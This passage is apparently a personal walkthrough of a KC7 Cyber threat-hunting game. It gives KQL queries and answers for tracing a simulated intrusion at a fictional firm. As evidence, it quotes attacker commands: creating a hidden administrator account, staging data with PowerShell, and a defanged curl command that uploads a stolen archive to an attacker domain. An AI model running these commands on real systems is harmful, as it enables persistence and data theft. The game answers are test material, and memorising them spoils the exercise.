or link has "news-on-industry[.]com"
or link has "eco-awareness-update[.]net"
| where recipient == "carla_whartonATsolvisystems[.]com"
| distinct recipient
| lookup Employees on $left.recipient == $right.email_addr
| distinct hostname
| lookup FileCreationEvents on $left.hostname == $right.hostname
| where timestamp >= datetime(2024-05-01T15:57:41Z)</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>ecobug.exe</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>It's always good to take a look and note down all pertinent information, such as the sha256 hashes.</p>
            </div>
          </section> <!--question 15-->
          <section class="question-card" id="question41"> <!--question 16-->
            <h4>Q16 - What was the hash of the file?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code></code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>1c3ef0407d5714037504c52f7abfa86c081fd7a021b52e2abe8a669f92413252</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>...As I said.</p>
            </div>
          </section> <!--question 16-->
        </section> <!--section 3-->
        <section id="section4"><!--section 4-->
          <h3>Section 4 - EcoShock</h3>
          <!--the card containing the answers, composed of three elements: the KQL query used, the answer as typed on KC7 Cyber, and a comment-->
          <section class="question-card" id="question42"> <!--question 1-->
            <h4>Q1 - How many records do we have of this file being created on Solvi Systems computers?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>FileCreationEvents
| where filename == "ecobug.exe"</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>39</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>This builds upon the previous questions; we're still investigating this suspicious file.</p>
              <p>Let's make a simpler query now. An interesting thing is that if you look for distinct hostnames (i.e. devices) there's 38; it got created twice somewhere. Using a query such as</p>
              <pre></code>FileCreationEvents
| where filename == "ecobug.exe"
| summarize count() by hostname
| sort by count_</code></pre>
              <p>We can see that it got created twice on <code>QP7A-MACHINE</code>; if we look at the <code>Employees</code> table, it's Customer Support Specialist Virginia Hesse.</p>
              <p>And if we check <code>FileCreationEvents</code> on her machine, we see there's an <code>ecobug.exe</code> with a different sha256 hash: <code>4c199019661ef7ef79023e2c960617ec9a2f275ad578b1b1a027adb201c165f3</code></p>
              <p>Which was created ~10 minutes earlier than the one with the hash we found on <a href="#question41">S3 Q16</a>.</p>
              <p>Another fun thing to do is pivot (such as by using a <code>lookup</code> query) to see how many roles and people of that role were affected.</p>
              <pre><code>FileCreationEvents
| where filename == "ecobug.exe"
| distinct hostname
| lookup Employees on $left.hostname == $right.hostname
| summarize count() by role
| sort by count_</code></pre>
              <p>The most affected roles were Customer Service Specialists, as to be expected, followed by Sales Representatives, a Project Manager for Docks ICS(!), a Docks Customer Success Manager(!) and a DOCKS ICS Security Lead(!!!!)</p>
            </div>
          </section> <!--question 1-->
          <section class="question-card" id="question43"> <!--question 2-->
            <h4>Q2 - What IP address does ecobug.exe connect to in order to establish persistence?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>Email
| where link has "energy-trends4u[.]net"
or link has "news-on-industry[.]com"
or link has "eco-awareness-update[.]net"
| where recipient == "carla_whartonATsolvisystems[.]com"
| distinct recipient
| lookup Employees on $left.recipient == $right.email_addr
| distinct hostname
| lookup ProcessEvents on $left.hostname == $right.hostname
| where process_commandline has "ecobug.exe"</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>98[.]117[.]26[.]236</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>Return to analysing Carla Wharton's computer to see what this "ecobug" does. ~2 hours after being created, it connects to an attacker-controlled server...</p>
            </div>
          </section> <!--question 2-->
          <section class="question-card" id="question44"> <!--question 3-->
            <h4>Q3 - What is the port number that is used?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code></code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>1337</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>...at port "leet". [hackerman dot gif]</p>
            </div>
          </section> <!--question 3-->
          <section class="question-card" id="question45"> <!--question 4-->
            <h4>Q4 - How many times does Carla's machine connect to the suspicious IP address?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>Email
| where link has "energy-trends4u[.]net"
or link has "news-on-industry[.]com"
or link has "eco-awareness-update[.]net"
| where recipient == "carla_whartonATsolvisystems[.]com"
| distinct recipient
| lookup Employees on $left.recipient == $right.email_addr
| distinct ip_addr
| lookup NetworkFlow on $left.ip_addr == $right.src_ip
| where dest_ip == "98[.]117[.]26[.]236"</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>24</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>Note the timestamps: the bug connected once a day. Especifically, every 24 hours on the dot.</p>
            </div>
          </section> <!--question 4-->
          <section class="question-card" id="question46"> <!--question 5-->
            <h4>Q5 - How many times a day does Carla's machine make its recurring connection to the suspicious IP?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code></code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>1</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>Take notes, notice things, etc.</p>
            </div>
          </section> <!--question 5-->
          <section class="question-card" id="question47"> <!--question 6-->
            <h4>Q6 - At what time does this connection take place? (format hh:mm:ss)</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code></code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>17:38:25</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p></p>
            </div>
          </section> <!--question 6-->
          <section class="question-card" id="question48"> <!--question 7-->
            <h4>Q7 - How many total connections do we see between this IP and Solvi Systems employee machines?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>NetworkFlow
| where dest_ip == "98[.]117[.]26[.]236"</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>470</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>Back to a simple query.</p>
              </p>We can use <code>summarize count() by dest_ip</code> with <code>sort by count_</code> to get an overview of what IP addresses were the ones doing the most connections, and by doing a lookup on the <code>Employees</code> table and <code>summarize count() by src_ip, name, role</code> we get a nice table of the people and roles whose devices made the most connections.</p>
              <p>We can further filter for the DOCKS fellas we found in our other optional queries (see the <a href="#question42">S4 Q1</a> comment)...</p>
              <pre><code>name          role                           count_
Jamie Lee     Project Manager for Docks ICS  23
Alexei Petrov Docks Customer Success Manager 22
Taylor Green  DOCKS ICS Security Lead        2</code></pre>
              <p>Hm!</p>
            </div>
          </section> <!--question 7-->
          <section class="question-card" id="question49"> <!--question 8-->
            <h4>Q8 - How many distinct employee machines are involved in those connections?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>NetworkFlow
| where dest_ip == "98[.]117[.]26[.]236"
| distinct src_ip</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>38</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>Which we might've already found out if curiosity got the best of us (see the <a href="#question42">S4 Q1</a> comment)</p>
            </div>
          </section> <!--question 8-->
          <section class="question-card" id="question50"> <!--question 9-->
            <h4>Q9 - What is the name of the newly created user?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>Email
| where link has "energy-trends4u[.]net"
or link has "news-on-industry[.]com"
or link has "eco-awareness-update[.]net"
| where recipient == "carla_whartonATsolvisystems[.]com"
| distinct recipient
| lookup Employees on $left.recipient == $right.email_addr
| distinct hostname
| lookup ProcessEvents on $left.hostname == $right.hostname
| where timestamp >= datetime(2024-05-01T15:57:41Z)</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>gu@rd!an</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>Let's go back to investigating Carla Wharton's device. Remember the date time is when she first clicked the evil link in the email (see <a href="#question39">S3 Q14</a>)</p>
              <p>After establishing persistence, attackers run some discovery commands: <code>netstat -an</code>, <code>ipconfig /all</code>, <code>net view</code>, <code>systeminfo</code>.</p>
              <p>...And then use <code>net users /add gu@rd!an abc1toothree</code> to create a new user, and <code>net localgroup administrators gu@rd!an /add</code> to make it an administrator account.</p>
              <p>Ruh-roh.</p>
              <p>(They also run other discovery commands afterwards.)</p>
            </div>
          </section> <!--question 9-->
          <section class="question-card" id="question51"> <!--question 10-->
            <h4>Q10 - What is that user's password?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code></code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>abc1toothree</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>[sic]</p>
            </div>
          </section> <!--question 10-->
          <section class="question-card" id="question52"> <!--question 11-->
            <h4>Q11 - What was the last discovery command that the adversaries ran?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code></code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>PLACEHOLDER</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p></p>
            </div>
          </section> <!--question 11-->
        </section> <!--section 4-->
        <section id="section5"><!--section 5-->
          <h3>Section 5 - A Shocking Ending</h3>
          <!--the card containing the answers, composed of three elements: the KQL query used, the answer as typed on KC7 Cyber, and a comment-->
          <section class="question-card" id="question53"> <!--question 1-->
            <h4>Q1 - How many distinct commands containing the term net use were run on SolviSystem devices?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>ProcessEvents
| where process_commandline has "net use"
| distinct process_commandline</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>2</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>Since Carla Wharton is not a very interesting employee (no offence), the attackers didn't do anything else on her system.</p>
              <p>The game invites us to use <code>net use</code> -- the last command executed on Carla's machine -- as an anchor point to continue our investigations. Hence the query.</p>
              <p>We're shown the usual <code>net use</code> command, followed by a new one with the option <code>/PERSISTENT:YES</code></p>
              <p>Ruh-roh!</p>
            </div>
          </section> <!--question 1-->
          <section class="question-card" id="question54"> <!--question 2-->
            <h4>Q2 - What new command using net use did we find?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code></code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>net use /PERSISTENT:YES</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>From <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/gg651155(v=ws.11)">the pertient Microsoft Learn page</a>: "[<code>net use /PERSISTENT:YES</code>] [...] saves all connections as they are made, and restores them at next logon. [...]"</p>
              <p>Perfect for these nefarious threat actors.</p>
            </div>
          </section> <!--question 2-->
          <section class="question-card" id="question55"> <!--question 3-->
            <h4>Q3 - How many distinct hosts was this command run on?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>ProcessEvents
| where process_commandline == "net use /PERSISTENT:YES"</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>3</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>You won't believe who these hosts are... (<code>lookup</code> query go brr)</p>
              <pre><code>timestamp            hostname     name          role
2024-05-27T16:23:10Z SJ9V-MACHINE Alexei Petrov Docks Customer Success Manager
2024-05-28T16:43:31Z UPLM-DESKTOP Jamie Lee     Project Manager for Docks ICS
2024-05-29T12:23:25Z JP4D-MACHINE Taylor Green  DOCKS ICS Security Lead</code></pre>
              <p>Say it ain't so... (see <a href="#question42">S4 Q1</a> comment)</p>
            </div>
          </section> <!--question 3-->
          <section class="question-card" id="question56"> <!--question 4-->
            <h4>Q4 - What is the timestamp for the first time this command was run?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code></code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>2024-05-27T16:23:10Z</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p></p>
            </div>
          </section> <!--question 4-->
          <section class="question-card" id="question57"> <!--question 5-->
            <h4>Q5 - What is the hostname from that timestamp?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>ProcessEvents
| where process_commandline == "net use /PERSISTENT:YES"
| lookup Employees on $left.hostname == $right.hostname</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>SJ9V-MACHINE</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p><code>lookup</code> query go brr!!</p>
            </div>
          </section> <!--question 5-->
          <section class="question-card" id="question58"> <!--question 6-->
            <h4>Q6 - Who is the employee associated with that hostname?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code></code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>Alexei Petrov</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p></p>
            </div>
          </section> <!--question 6-->
          <section class="question-card" id="question59"> <!--question 7-->
            <h4>Q7 - What is that employee's role?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code></code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>Docks Customer Success Manager</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p></p>
            </div>
          </section> <!--question 7-->
          <section class="question-card" id="question60"> <!--question 8-->
            <h4>Q8 - What is the command used to copy files related to SoftwareDevelopment?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>ProcessEvents
| where timestamp >= datetime(2024-05-27T16:23:10Z)
| where hostname == "SJ9V-MACHINE"</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>Copy-Item -Path \\\\solvisystems[.]com\\SharedDocs\\SoftwareDevelopment\\CycleDocuments\\* -Destination C:\\Users\\alpetrov\\CollectedData\\Software_Cycle_Docs</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>Let's see what they did after establishing a constant connection to Alexei's computer. They immediately start exploring directories, and quickly get to work making copies of sensitive corporate information.</p>
              <p>Besides the software development information, they also copied the documentation. Both were copied to the CollectedData directory, and compressed.</p>
              <p><code>Compress-Archive -Path C:\Users\alpetrov\CollectedData\* -DestinationPath C:\DataExfil\CollectedData.zip</code></p>
            </div>
          </section> <!--question 8-->
          <section class="question-card" id="question61"> <!--question 9-->
            <h4>Q9 - What is the name of the archive file containing the copied documents?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code></code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>CollectedData.zip</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p></p>
            </div>
          </section> <!--question 9-->
          <section class="question-card" id="question62"> <!--question 10-->
            <h4>Q10 - The next day the data was exfiltrated using what command?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code></code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>curl -F 'file=@C:\DataExfil\CollectedData.zip' hxxps[://]api[.]eco-awareness-update[.]net/upload</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p></p>
            </div>
          </section> <!--question 10-->
          <section class="question-card" id="question63"> <!--question 11-->
            <h4>Q11 - How many accounts were used by the threat actor to exfiltrate sensitive information from Solvi Systems?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>ProcessEvents
| where process_commandline startswith "curl"
| distinct username</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>3</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>The three same employees from before.</p>
            </div>
          </section> <!--question 11-->
          <section class="question-card" id="question64"> <!--question 12-->
            <h4>Q12 - The threat actors were observed reading an "internal process" document from an internal portal called ____[.]solvisystems[.]com</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>InboundNetworkEvents
| where timestamp >= datetime(2024-05-27T16:23:10Z)</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>devportal</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>Taking the timestamp from the first time the net use /PERSISTENCE:YES command was used on Alexei's computer, we scan the queries they made. The answer isn't hard to find.</p>
            </div>
          </section> <!--question 12-->
          <section class="question-card" id="question65"> <!--question 13-->
            <h4>Q13 - What was the subject of those emails?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>ProcessEvents
| where process_commandline == "net use /PERSISTENT:YES"
| lookup Employees on $left.hostname == $right.hostname
| distinct email_addr
| lookup Email on $left.email_addr == $right.sender
| where timestamp >= datetime(2024-05-27T16:23:10Z)
| summarize count() by timestamp, subject
| sort by count_</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>Do you know where the DOCKS software documentation is stored? 🤪</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>We're told the threat actors even tried asking nicely about the SDLC (Software Development LifeCycle) using the compromised accounts. That's pretty funny and potentially effective.</p>
              <p>Note that our query builds upon the one that found out these three were the ones affected by the <code>net use /PERSISTENT:YES</code> command. (S5 Q5)</p>
            </div>
          </section> <!--question 13-->
          <section class="question-card" id="question66"> <!--question 14-->
            <h4>Q14 - Type "wooo" to receive credit</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code></code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>wooo</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>It's the end!</p>
              <p>Or is it...?</p>
            </div>
          </section> <!--question 14-->
          <section class="question-card" id="question67"> <!--question 15-->
            <h4>Q15 - Type "guardians" to finish this module. Stay tuned for the next module to see what the guardians might do next! 😱</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code></code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>guardians</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>We're shown a tweet by Guardians of Adamastor (ATgofadamastor), acknowledging that they got caught but it was too late for Solvi Systems, they already got the information they needed, and that "big things" will happen (at some vague point in the future). There's a hashtag for #holdEskomResponsible ... Which you may remember from <a href="#question6">S1 Q6</a>.</p>
            </div>
          </section> <!--question 15-->
        </section> <!--section 5-->
      </article> <!--game sections-->
    </main><!--main page content-->
    <footer><!--website footer-->
      <a class="skip" href="#page-navigation">Return to page navigation</a>
      <p>Made with vanilla HTML + CSS by shoutvoid</p>
      <address>
        <a href="mailto:shoutvoid@proton.me">shoutvoid@proton.me</a>
        <a href="https://github.com/ShoutVoid">GitHub</a>
        <a href="https://play.picoctf.org/users/shoutvoid">picoCTF</a>
        <a href="https://kc7cyber.com/profile/shoutvoid">KC7Cyber</a>
      </address>
    </footer><!--website footer-->
  </body>
</html>
